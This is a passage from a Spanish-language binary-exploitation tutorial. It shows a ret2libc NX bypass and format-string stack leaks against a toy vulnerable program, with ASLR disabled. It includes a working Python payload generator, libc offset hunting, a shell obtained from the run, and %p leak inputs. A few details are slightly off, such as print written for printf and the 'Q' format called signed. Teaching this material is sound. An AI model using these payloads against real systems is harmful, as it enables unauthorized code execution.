+como el del ejemplo en [3.2]. Busquemos en libc todo lo necesario:
+
+	$ gcc -g -o ejecuta ejecutar.c
+	$ ldd ejecuta | grep libc
+	libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007ffff7838000)
+
+
+ldd imprime las bibliotecas compartidas requeridas por 'ejecuta'.
+Encontramos la ubicación de libc.
+
+	$ strings -tx /lib/x86_64-linux-gnu/libc.so.6 | grep /bin/sh
+ 	161c19 /bin/sh
+
+Encontramos el offset de la cadena /bin/sh en libc.
+
+Si hacemos memoria, algo fundamental que aprendimos del desensamblaje que hicimos del
+programa "ejecuta" es que para que se ejecute la syscall que queremos debemos tener la
+dirección que apunta a la cadena "/bin/sh" en el registro RDI.
+
+	$ objdump -M intel -d /lib/x86_64-linux-gnu/libc.so.6 | grep execve -B5 | grep rdi -C3 | grep 161c19 -C3
+
+--
+   b8c07:	48 89 ca             	mov    rdx,rcx
+   b8c0a:	e8 81 b2 fc ff       	call   83e90 <memcpy@GLIBC_2.2.5>
+   b8c0f:	48 8d 3d 03 90 0a 00 	lea    rdi,[rip+0xa9003]        # 161c19 <_libc_intl_domainname@@GLIBC_2.2.5+0x159>
+   b8c16:	4c 89 e2             	mov    rdx,r12
+   b8c19:	4c 89 ee             	mov    rsi,r13
+   b8c1c:	e8 1f fa ff ff       	call   b8640 <execve@@GLIBC_2.2.5>
+--
+   d6b9a:	e8 81 53 00 00       	call   dbf20 <__close@@GLIBC_2.2.5>
+   d6b9f:	48 8b 05 12 23 2c 00 	mov    rax,QWORD PTR [rip+0x2c2312]        # 398eb8 <__environ@@GLIBC_2.2.5-0x3080>
+   d6ba6:	48 8d 74 24 60       	lea    rsi,[rsp+0x60]
+   d6bab:	48 8d 3d 67 b0 08 00 	lea    rdi,[rip+0x8b067]        # 161c19 <_libc_intl_domainname@@GLIBC_2.2.5+0x159>
+   d6bb2:	48 8b 10             	mov    rdx,QWORD PTR [rax]
+   d6bb5:	e8 86 1a fe ff       	call   b8640 <execve@@GLIBC_2.2.5>
+--
+
+Vemos el código maquina de libc y buscamos todos los call a execve y imprimimos solo
+las cinco últimas. Un pipe de la salida y buscamos una cadena con rdi e imprimimos
+tres instrucciones antes y después. Otra vez pipe de la salida y buscamos una
+referencia de la ubicación de la cadena /bin/sh.
+
+d6b9f:	48 8b 05 12 23 2c 00 	mov    rax,QWORD PTR [rip+0x2c2312]        # 398eb8 <__environ@@GLIBC_2.2.5-0x3080>
+
+Ésta es la línea que nos interesa, ejecuta execve con la cadena "/bin/sh/.
+
+Ahora necesito la dirección de libc.
+
+	$ gdb ejecuta
+	$ (gdb) b main
+	$ r
+	$ info proc map
+
+Mapped address spaces:
+
+          Start Addr           End Addr       Size     Offset objfile
+      0x555555554000     0x555555555000     0x1000        0x0 /home/carlitos/assembler/zonaDeNadie/a.out
+      0x555555754000     0x555555755000     0x1000        0x0 /home/carlitos/assembler/zonaDeNadie/a.out
+      0x555555755000     0x555555756000     0x1000     0x1000 /home/carlitos/assembler/zonaDeNadie/a.out
+      0x7ffff7a3a000     0x7ffff7bcf000   0x195000        0x0 /lib/x86_64-linux-gnu/libc-2.24.so
+      0x7ffff7bcf000     0x7ffff7dcf000   0x200000   0x195000 /lib/x86_64-linux-gnu/libc-2.24.so
+      0x7ffff7dcf000     0x7ffff7dd3000     0x4000   0x195000 /lib/x86_64-linux-gnu/libc-2.24.so
+      0x7ffff7dd3000     0x7ffff7dd5000     0x2000   0x199000 /lib/x86_64-linux-gnu/libc-2.24.so
+      0x7ffff7dd5000     0x7ffff7dd9000     0x4000        0x0
+      0x7ffff7dd9000     0x7ffff7dfc000    0x23000        0x0 /lib/x86_64-linux-gnu/ld-2.24.so
+      0x7ffff7fd8000     0x7ffff7fda000     0x2000        0x0
+      0x7ffff7ff8000     0x7ffff7ffa000     0x2000        0x0 [vvar]
+      0x7ffff7ffa000     0x7ffff7ffc000     0x2000        0x0 [vdso]
+      0x7ffff7ffc000     0x7ffff7ffd000     0x1000    0x23000 /lib/x86_64-linux-gnu/ld-2.24.so
+      0x7ffff7ffd000     0x7ffff7ffe000     0x1000    0x24000 /lib/x86_64-linux-gnu/ld-2.24.so
+      0x7ffff7ffe000     0x7ffff7fff000     0x1000        0x0
+      0x7ffffffde000     0x7ffffffff000    0x21000        0x0 [stack]
+  0xffffffffff600000 0xffffffffff601000     0x1000        0x0 [vsyscall]
+
+Y nos interesa la dirección de libc con desplazamiento 0x0:
+
+0x7ffff7a3a000     0x7ffff7bcf000   0x195000        0x0 /lib/x86_64-linux-gnu/libc-2.24.so
+
+Vamos a escribir un código en python que escriba en un archivo el relleno con la
+dirección de retorno que hay que sobreescribir y la dirección de la cadena en RDI.
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+		nxPass.py
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+from os import system
+from struct import pack
+
+relleno = 'A' * 136
+dir_libc = 0x7ffff7a3a000
+cadenaConShell = pack('Q', dir_libc + 0xd6b9f)
+payload = relleno + cadenaConShell
+
+with open('mecanismo', 'w') as archivo:
+	archivo.write(payload)
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+pack nos devuelve una cadena que contiene las direcciones comprimidas con el formato
+"Q" (long long int con signo -9.223.372.036.854.775.807 a 9.223.372.036.854.775.807).
+Se usa para convertir direcciones de 64 bits en little endian.
+
+	$ python nxPass.py
+
+Ésto creara un arhivo 'mecanismo', que si lo ejecutamos junto con vuln pasará la
+restricción NX. Ejecute el programa ./vuln compilado sin marcar el stack ejecutable,
+pero vamos a tener desactivado el ASLR.
+
+$ ./vuln `cat mecanismo`
+bash: aviso: command substitution: ignored null byte in input
+0x7fffffffe010
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�
+                                                               ���
+$ whoami
+carlitos
+$ exit
+
+También podemos colocar al final del código de nxPass.py la línea
+system("./vuln `cat mecanismo`") para que se ejecute desde el script en python.
+
+Cuando no conoce la versión de libc del destino, puede buscar bases de datos de libc en
+línea para encontrar mejor la versión de libc para un destino. Una cosa que puede notar
+es que los últimos tres dígitos en la dirección de libc siempre son '000'.
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+[6]- Format String
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+	Ésta vulnerabilidad se dá por el mal uso que se le da a las funciones de formato
+como printf, fprint que convierten una variable primitiva del lenguaje de programación
+en una representación de cadena legible para humanos. Se producen cuando la aplicación
+evalúa los datos enviados de una cadena de entrada como un comando. Por ejemplo:
+
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+ 		formatString.c
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+	#include <stdio.h>
+	#include <stdlib.h>
+
+	void main(int argc, char **argv){
+		char buffer[128];
+
+		if(argc != 2){ exit(0); }
+
+		print( argv[1] );
+	}
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+Un usuario podría pasar como parámetro una cadena que contenga "%lx" o "%p" para leer
+datos del stack, lx y p son equivalentes. El argumento "%c" omite 4 bytes de la
+posición donde se ubique. Los format-strings también permiten escribir datos en la
+memoria, pero dado que necesitamos apuntar a una dirección canonica y no podemos pasar
+bytes nulos por cadena, se límitan más a la obtención de datos del stack.
+
+$ ./formatString $(printf "\x7f\xff\xff\xff\xde\xd0")"%p %p %p %p %p %p %p %p %p %p %p %p %p %p"
+�����0x7ffca45764e0 0x70 0x7f5e815604e0 0x5599ebee08c0 0x7f5e8187aba0 0x7ffca4575ee8 0x200000000 0x7025d0deffffff7f 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x70252070252070 0x7ffca4575dde
+
+Note que en el octavo puntero que se imprimió a partir del tercer byte es nuestra
+dirección que le pedimos a python que imprimiese. Si no to %p en hexadecimal
+es 207025 un patrón que se repite.
+
+$ ./formatString $(python -c 'print "%c%c%c%c%c%c\x7f\xff\xff\xff\xde\xd0"[::-1]')"%p %p %p %p %p %p %p %p %p %p %p %p %p %p"
+�����c�p���%p 0x7ffc4f4413b8 0x200000000 0x25637fffffffded0 0x2563256325632563 0x2070252070252563 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x7fc300702520 0x1 0x55f4c64f189d (nil)
+
+Ésta vez el argumento %c corrió los bytes para que que el puntero se imprimiese en
+cuarto lugar. Si noto %c en hexadecimal es 2563 otro patrón que se repite.
+
+$ ./formatString "AAAA %p %p %p %p %p %p %p %p %p %p"
+AAAA 0x7ffd6bf284e0 0x70 0x7efc2af414e0 0x56029fc77870 0x7efc2b25bba0 0x7ffd6bf27af8 0x200000000 0x2070252041414141 0x7025207025207025 0x2520702520702520
+
+$ ./formatString 'AAAA %8$p'
+AAAA 0x2438252041414141
+
+$ ./formatString "%lx %lx %lx %lx"
+7fff628f94d2 f 7f14c57245c0 5622c5160870
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
